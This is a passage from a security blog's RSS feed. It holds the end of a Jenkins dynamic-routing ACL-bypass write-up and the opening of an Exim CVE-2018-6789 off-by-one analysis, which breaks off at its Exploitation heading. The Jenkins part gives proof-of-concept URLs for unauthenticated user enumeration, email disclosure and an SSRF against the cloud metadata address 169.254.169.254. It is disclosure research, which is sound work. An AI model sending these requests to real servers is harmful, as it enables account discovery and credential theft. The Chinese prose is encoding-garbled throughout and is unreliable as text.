    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™ä¹Ÿä»£è¡¨è‘—ä¸€é–‹å§‹å¯é¸çš„å…¥å£é™åˆ¶æ›´åš´æ ¼é¸æ“‡æ›´å°‘, ä½†å¦‚æœèƒ½åœ¨ä¸€å€‹ç™½åå–®ä¸Šçš„å…¥å£æ‰¾åˆ°å…¶ä»–ç‰©ä»¶åƒè€ƒ, è·³åˆ°éç™½åå–®ä¸Šçš„æˆå“¡è±ˆä¸å¯ä»¥ç¹éå‰è¿°çš„ URL å‰ç¶´é™åˆ¶? å¯èƒ½æœ‰é»é›£ç†è§£, é€™è£¡å…ˆä¾†ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ä¾†è§£é‡‹ Jenkins çš„å‹•æ…‹è·¯ç”±æ©Ÿåˆ¶:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä»¥ä¸Šç¶²å€æœƒä¾åºåŸ·è¡Œä¸‹åˆ—æ–¹æ³•&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸Šé¢çš„åŸ·è¡Œéˆä¸€å€‹ä¸²ä¸€å€‹é›–ç„¶çœ‹èµ·ä¾†å¾ˆæµæš¢, ä½†é›£éçš„æ˜¯ç„¡æ³•å–å¾—å›å‚³å…§å®¹, å› æ­¤åš´æ ¼ä¾†èªªä¸èƒ½ç®—æ˜¯ä¸€å€‹é¢¨éšª, ä½†é€™å€‹ä¾‹å­å°æ–¼ç†è§£æ•´å€‹æ¼æ´æ ¸å¿ƒå»æœ‰å¾ˆå¤§çš„å¹«åŠ©!&lt;/p&gt;

&lt;p&gt;åœ¨äº†è§£åŸç†å¾Œ, å‰©ä¸‹çš„äº‹å°±åƒæ˜¯åœ¨è§£ä¸€å€‹è¿·å®®, å¾ &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; é€™å€‹å…¥å£é»é–‹å§‹, ç‰©ä»¶ä¸­çš„æ¯å€‹æˆå“¡åˆå¯ä»¥åƒè€ƒåˆ°ä¸€å€‹æ–°çš„ç‰©ä»¶, æ¥è‘—è¦åšçš„å°±æ˜¯æƒ³è¾¦æ³•æŠŠä¸­é–“éŒ¯ç¶œè¤‡é›œå„ç¨®ç‰©ä»¶èˆ‡ç‰©ä»¶é–“çš„é—œè¯æ‰¾å‡ºä¾†, ä¸€å±¤ä¸€å±¤çš„ä¸²ä¸‹å»ç›´åˆ°è¿·å®®å‡ºå£ - ä¹Ÿå°±æ˜¯å±éšªçš„å‡½æ•¸å‘¼å«!&lt;/p&gt;

&lt;p&gt;å€¼å¾—ä¸€æçš„æ˜¯, é€™å€‹æ¼æ´æœ€å¯æƒœçš„åœ°æ–¹æ‡‰è©²æ˜¯ç„¡æ³•é‡å° SETTER é€²è¡Œæ“ä½œ, ä¸ç„¶çš„è©±æ‡‰è©²å°±åˆæ˜¯å¦å¤–ä¸€å€‹æœ‰è¶£çš„ &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; æˆ–æ˜¯ &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt; äº†!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•åˆ©ç”¨&quot;&gt;å¦‚ä½•åˆ©ç”¨&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;æ‰€ä»¥è©²å¦‚ä½•åˆ©ç”¨é€™å€‹æ¼æ´å‘¢? ç°¡å–®èªª, é€™å€‹æ¼æ´æ‰€èƒ½åšåˆ°çš„äº‹æƒ…å°±åªæ˜¯é€éç‰©ä»¶é–“çš„åƒè€ƒå»ç¹é ACL æ”¿ç­–, ä½†åœ¨æ­¤ä¹‹å‰æˆ‘å€‘å¿…é ˆå…ˆæ‰¾åˆ°ä¸€å€‹å¥½çš„è·³æ¿å¥½è®“æˆ‘å€‘å¯ä»¥æ›´æ–¹ä¾¿çš„åœ¨ç‰©ä»¶ä¸­è·³ä¾†è·³å», é€™è£¡æˆ‘å€‘é¸ç”¨äº†ä¸‹é¢é€™å€‹è·³æ¿:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è·³æ¿æœƒä¾åºåŸ·è¡Œä¸‹é¢æ–¹æ³•&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨ Jenkins ä¸­å¯ä»¥è¢«æ“ä½œçš„ç‰©ä»¶éƒ½æœƒç¹¼æ‰¿ä¸€å€‹ &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt; é¡åˆ¥, è€Œç¹¼æ‰¿é€™å€‹é¡åˆ¥çš„ç‰©ä»¶éƒ½å¯ä»¥é€é &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt; å»å­˜å–, æ‰€ä»¥ç¸½é«”ä¾†èªª, å¯é€éé€™å€‹è·³æ¿å–å¾—åœ¨ Jenkins ä¸­ç´„ 500 å€‹ Despicable çš„ç‰©ä»¶é¡åˆ¥!&lt;/p&gt;

&lt;p&gt;ä¸éé›–æ˜¯å¦‚æ­¤, ç”±æ–¼ Jenkins çš„è¨­è¨ˆæ¨¡å¼, å¤§éƒ¨åˆ†é–‹ç™¼è€…åœ¨å±éšªå‹•ä½œä¹‹å‰éƒ½æœƒå†åšä¸€æ¬¡æ¬Šé™æª¢æŸ¥, æ‰€ä»¥å³ä½¿å¯å‘¼å«åˆ° &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; ä½†åœ¨æ²’æœ‰ &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt; æ¬Šé™çš„æƒ…æ³ä¸‹ä¹Ÿç„¡æ³•åšä»»ä½•äº‹ :(&lt;/p&gt;

&lt;p&gt;ä½†é€™å€‹æ¼æ´ä¾ç„¶ä¸å¤±æˆç‚ºä¸€å€‹å¾ˆå¥½çš„è† æ°´å»ç¹éç¬¬ä¸€å±¤çš„ ACL é™åˆ¶ä¸²èµ·å…¶ä»–çš„æ¼æ´, ç‚ºå¾ŒçºŒçš„åˆ©ç”¨é–‹å•Ÿäº†ä¸€é“çª—! ä»¥ä¸‹æˆ‘å€‘çµ¦å‡ºä¸‰å€‹ä¸²å‡ºæ¼æ´éˆçš„ä¾‹å­!&lt;br /&gt;
(é›–ç„¶åªä»‹ç´¹ä¸‰ç¨®, ä½†ç”±æ–¼é€™å€‹æ¼æ´ç©æ³•éå¸¸è‡ªç”±å¯ä¸²çš„çµ•ä¸åªå¦‚æ­¤, æ¨è–¦æœ‰èˆˆè¶£çš„åŒå­¸å¯åœ¨å°‹æ‰¾æ›´å¤šçš„æ¼æ´éˆ!)&lt;/p&gt;

&lt;p&gt;P.S. å€¼å¾—æ³¨æ„çš„ä¸€é»æ˜¯, åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt; çš„å¯¦ç¾ä¸­æœƒå‘¼å«åˆ° &lt;code class=&quot;highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; ä¸¦ä¸”å‚³å…¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;create=True&lt;/code&gt; å°è‡´åœ¨è¨˜æ†¶é«”ä¸­å‰µé€ å‡ºä¸€å€‹æš«å­˜ä½¿ç”¨è€…(æœƒå‡ºç¾åœ¨ä½¿ç”¨è€…åˆ—è¡¨ä½†ç„¡æ³•é€²è¡Œç™»å…¥æ“ä½œ), é›–ç„¶ç„¡ç”¨ä¸éä¹Ÿè¢«ç•¶æˆä¸€å€‹æ¼æ´è¨˜éŒ„åœ¨ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-å…ç™»å…¥çš„ä½¿ç”¨è€…è³‡è¨Šæ´©æ¼&quot;&gt;1. å…ç™»å…¥çš„ä½¿ç”¨è€…è³‡è¨Šæ´©æ¼&lt;/h3&gt;

&lt;p&gt;åœ¨æ¸¬è©¦ Jenkins æ™‚, æœ€æ€•çš„å°±æ˜¯è¦é€²è¡Œå­—å…¸æª”æ”»æ“Šæ™‚å»ä¸çŸ¥é“è©²æ”»æ“Šå“ªå€‹å¸³è™Ÿ, ç•¢ç«Ÿå¸³è™Ÿæ°¸é æ¯”å¯†ç¢¼é›£çŒœ! é€™æ™‚é€™å€‹æ¼æ´å°±å¾ˆå¥½ç”¨äº†XD&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ Jenkins å°æœå°‹çš„åŠŸèƒ½ä¸¦æ²’æœ‰åŠ ä¸Šé©ç•¶çš„æ¬Šé™æª¢æŸ¥, å› æ­¤åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; çš„ç‹€æ³ä¸‹å¯ä»¥é€éä¿®æ”¹ &lt;code class=&quot;highlighter-rouge&quot;&gt;keyword&lt;/code&gt; åƒæ•¸å¾ a åˆ° z å»åˆ—èˆ‰å‡ºæ‰€æœ‰ä½¿ç”¨è€…!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é™¤æ­¤ä¹‹å¤–ä¹Ÿå¯æ­é…ç”± &lt;code class=&quot;highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; æ‰€å›å ±çš„ &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; é€²ä¸€æ­¥å–å¾—ä½¿ç”¨è€…ä¿¡ç®±, å¦‚:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-èˆ‡-cve-2018-1000600-æ­é…æˆå…ç™»å…¥ä¸”æœ‰å®Œæ•´å›é¡¯çš„-ssrf&quot;&gt;2. èˆ‡ CVE-2018-1000600 æ­é…æˆå…ç™»å…¥ä¸”æœ‰å®Œæ•´å›é¡¯çš„ SSRF&lt;/h3&gt;

&lt;p&gt;ä¸‹ä¸€å€‹è¦ä¸²çš„æ¼æ´å‰‡æ˜¯ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, é€™æ˜¯ä¸€å€‹ç”± &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(å°å°±æ˜¯æˆ‘XD) æ‰€å›å ±çš„æ¼æ´, é—œæ–¼é€™å€‹æ¼æ´å®˜æ–¹çš„æè¿°æ˜¯:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨å·²çŸ¥ Credentials ID çš„æƒ…å½¢ä¸‹å¯ä»¥æ´©æ¼ä»»æ„ Jenkins å„²å­˜çš„å¸³å¯†, ä½† Credentials ID åœ¨æ²’æŒ‡å®šçš„æƒ…æ³ä¸‹æœƒæ˜¯ä¸€çµ„éš¨æ©Ÿçš„ UUID æ‰€ä»¥é€ æˆè¦åˆ©ç”¨é€™å€‹æ¼æ´ä¼¼ä¹è®Šå¾—ä¸å¤ªå¯èƒ½ (å¦‚æœæœ‰äººçŸ¥é“æ€éº¼å–å¾— Credentials ID è«‹å‘Šè¨´æˆ‘!)&lt;/p&gt;

&lt;p&gt;é›–ç„¶åœ¨ä¸çŸ¥é“ Credentials ID çš„æƒ…æ³ä¸‹ç„¡æ³•æ´©æ¼ä»»ä½•å¸³å¯†, ä½†é€™å€‹æ¼æ´å…¶å¯¦ä¸åªé€™æ¨£, é‚„æœ‰å¦ä¸€å€‹ç©æ³•! é—œæ–¼é€™å€‹æ¼æ´æœ€å¤§çš„å±å®³å…¶å¯¦ä¸æ˜¯ CSRF, è€Œæ˜¯ SSRF!&lt;/p&gt;

&lt;p&gt;ä¸åƒ…å¦‚æ­¤, é€™å€‹ SSRF é‚„æ˜¯ä¸€å€‹æœ‰å›é¡¯çš„ SSRF! æ²’æœ‰å›é¡¯çš„ SSRF è¦åˆ©ç”¨èµ·ä¾†æœ‰å¤šå›°é›£æˆ‘æƒ³å¤§å®¶éƒ½çŸ¥é“ :P å› æ­¤ä¸€å€‹æœ‰å›é¡¯çš„ SSRF ä¹Ÿå°±é¡¯å¾—ä½•å…¶çè²´!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-æœªèªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œ&quot;&gt;3. æœªèªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œ&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;æ‰€ä»¥å»¢è©±å°‘èªª, RCE åœ¨å“ª?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç‚ºäº†æœ€å¤§ç¨‹åº¦çš„å»åˆ©ç”¨é€™å€‹æ¼æ´, æˆ‘ä¹ŸæŒ–äº†ä¸€å€‹&lt;strong&gt;éå¸¸æœ‰è¶£&lt;/strong&gt;çš„ RCE å¯ä»¥èˆ‡é€™å€‹æ¼æ´æ­é…ä½¿ç”¨æˆç‚ºä¸€å€‹çœŸæ­£æ„ç¾©ä¸Šä¸ç”¨èªè­‰çš„ RCE! ä½†ç”±æ–¼é€™å€‹æ¼æ´ç›®å‰é‚„åœ¨ Responsible Disclosure çš„æ™‚ç¨‹å…§, å°±è«‹å…ˆæœŸå¾… Hacking Jenkins Part 2 å›‰!&lt;br /&gt;
(é è¨ˆäºŒæœˆä¸­é‡‹å‡º!)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;é€™è£¡æ˜¯ä¸€äº›æˆ‘æƒ³ç¹¼çºŒç ”ç©¶çš„æ–¹å‘, å¯ä»¥è®“é€™å€‹æ¼æ´è®Šå¾—æ›´å®Œç¾! å¦‚æœä½ ç™¼ç¾äº†ä¸‹é¢ä»»ä½•ä¸€å€‹çš„è§£æ³•è«‹å‹™å¿…å‘Šè¨´æˆ‘, æˆ‘æœƒå¾ˆæ„Ÿæ¿€çš„XD&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; çš„æ¬Šé™ä¸‹æ‹¿åˆ° &lt;code class=&quot;highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; çš„ç‰©ä»¶åƒè€ƒ, å¦‚æœæ‹¿åˆ°çš„å¯ä»¥ç¹é &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; æ‰€éœ€çš„æœ€å°æ¬Šé™é™åˆ¶, æˆç‚ºä¸€å€‹çœŸæ­£æ„ç¾©ä¸Šçš„å…ç™»å…¥ä»»æ„è®€æª”!&lt;/li&gt;
  &lt;li&gt;åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; çš„æ¬Šé™ä¸‹æ‰¾å‡ºå¦ä¸€çµ„è·³æ¿å»å‘¼å« &lt;code class=&quot;highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt;. ç‚ºäº†ä¿®å¾© &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins å¾ 2.138 é–‹å§‹å° &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; å¢åŠ åˆ¤æ–· &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt; çš„&lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;æª¢æŸ¥&lt;/a&gt;, å°è‡´åŸæœ‰çš„è·³æ¿å¤±æ•ˆ!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;è‡´è¬&quot;&gt;è‡´è¬&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;æœ€å¾Œ, æ„Ÿè¬ Jenkins Security åœ˜éšŠå°¤å…¶æ˜¯ Daniel Beck çš„æºé€šå”èª¿èˆ‡æ¼æ´ä¿®å¾©! é€™è£¡æ˜¯ä¸€å€‹ç°¡å–®çš„å›å ±æ™‚é–“è»¸:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - å›å ±æ¼æ´çµ¦ Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins ä¿®è£œä¸¦åˆ†é… CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins ä¿®è£œä¸¦åˆ†é… CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins ä¿®å¾©ä¸¦åˆ†é… CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins ä¿®è£œä¸¦åˆ†é… CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - å›å ± Groovy æ¼æ´çµ¦ Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins ä¿®å¾© Groovy æ¼æ´ä¸¦åˆ†é… CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing</title>
                <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;We reported an overflow vulnerability in the base64 decode function of &lt;a href=&quot;https://www.exim.org/&quot;&gt;&lt;strong&gt;Exim&lt;/strong&gt;&lt;/a&gt; on 5 February, 2018, identified as &lt;a href=&quot;https://exim.org/static/doc/security/CVE-2018-6789.txt&quot;&gt;CVE-2018-6789&lt;/a&gt;. This bug exists since the first commit of exim, hence &lt;strong&gt;ALL versions&lt;/strong&gt; are affected. According to our research, it can be leveraged to gain &lt;strong&gt;Pre-auth Remote Code Execution&lt;/strong&gt; and at least 400k servers are at risk. Patched version 4.90.1 is already released and we suggest to upgrade exim immediately.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;All Exim versions below 4.90.1&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;one-byte-overflow-in-base64-decoding&quot;&gt;One byte overflow in base64 decoding&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;

&lt;p&gt;This is a calculation mistake of decode buffer length in &lt;code class=&quot;highlighter-rouge&quot;&gt;b64decode&lt;/code&gt; function:&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/base64.c#L153&quot;&gt;base64.c: 153 b64decode&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ustrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// perform decoding&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As shown above, exim allocates a buffer of &lt;code class=&quot;highlighter-rouge&quot;&gt;3*(len/4)+1&lt;/code&gt; bytes to store decoded base64 data. However, when the input is not a valid base64 string and the length is &lt;code class=&quot;highlighter-rouge&quot;&gt;4n+3&lt;/code&gt;, exim allocates &lt;code class=&quot;highlighter-rouge&quot;&gt;3n+1&lt;/code&gt; but consumes &lt;code class=&quot;highlighter-rouge&quot;&gt;3n+2&lt;/code&gt; bytes while decoding. This causes one byte heap overflow (aka off-by-one).&lt;br /&gt;
Generally, this bug is harmless because the memory overwritten is usually unused. However, this byte overwrites some critical data when the string fits some specific length. In addition, this byte is controllable, which makes exploitation more feasible.&lt;br /&gt;
Base64 decoding is such a fundamental function and therefore this bug can be triggered easily, causing remote code execution.&lt;br /&gt;
&lt;a id=&quot;back&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
